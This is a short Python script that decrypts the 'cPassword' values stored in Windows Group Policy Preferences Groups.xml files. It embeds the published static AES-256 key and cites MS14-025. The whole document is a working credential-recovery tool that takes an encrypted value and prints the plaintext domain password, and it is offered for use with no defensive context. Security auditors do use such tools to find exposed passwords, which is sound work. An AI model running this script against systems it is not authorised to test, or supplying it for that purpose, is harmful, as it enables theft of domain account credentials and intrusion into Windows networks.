#!/usr/bin/python
import base64
from Crypto.Cipher import AES

"""
 @ml_siegel
 
 Decrypt cPassword from Group.xml
 based on swintons AESCipher

 Decrypts 64 byte password with 256 bit static key.

 See: MS14-025
"""

unpad = lambda s : s[0:-ord(s[-1])]

def aes_decrypt(encrypted):
  KEY = """\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"""
  byte_key = bytearray(KEY)
  raw_encrypted = base64.b64decode("{}==".format(encrypted))
  iv = raw_encrypted[:16]
  cipher = AES.new(str(KEY), AES.MODE_CBC, iv)
  return unpad(cipher.decrypt(raw_encrypted[16:]))

def main():
  encrypted_password = input("Enter password, in quotes (ie \"aBcd/..\"): ")
  print("Password is: {}".format(aes_decrypt(encrypted_password)))

if __name__== "__main__":
  main()

